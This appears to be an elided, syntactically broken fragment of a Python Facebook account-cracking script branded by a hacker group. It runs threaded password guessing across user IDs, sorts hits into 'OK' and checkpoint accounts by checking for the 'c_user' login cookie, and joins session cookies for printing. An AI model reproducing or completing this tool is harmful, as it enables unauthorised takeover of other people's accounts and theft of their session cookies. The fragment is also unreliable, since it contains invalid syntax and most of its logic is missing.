...
def fuck(tmr nanir sawwa ):
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        print(" \033[38;5;46m=============================")
        print('===================================')
        print('[𝟎𝟏]\033[38;5;46m 𝑪𝒀𝑩𝑬𝑹 𝟗𝟗 𝑬𝑴𝑹𝑨𝑵')
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[38;5;46m[✮⃝𝑬𝑯𝑪=Arafa𝄟⃝]-[%s/%s]-[CP-%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
    ...
    'upgrade-insecure-requests': '1',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
#-----𝐎𝐊 𝐈𝐃 𝐈𝐍-𝐅𝐑𝐎👇👇              
                print(f"""\033[38;5;46m[𝐄𝐇𝐂-𝐄𝐌𝐑𝐀𝐍-𝐎𝐊✔️] 
...
#--------𝐋𝐎𝐎𝐊 𝐈𝐃 𝐈𝐍 𝐅𝐑𝐎👇👇
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"""\033[38;5;46m[𝐄𝐇𝐂-𝐄𝐌𝐑𝐀𝐍-CP😭] 
...
#𝑪𝑹𝑲 𝑺𝒀𝑺𝑻𝑬𝑴✔️✔️✔️✔️✔️              
        ...
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}𝐄𝐇𝐂-𝐂𝐘𝐁𝐄𝐑-𝐄𝐌𝐑𝐀𝐍 {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
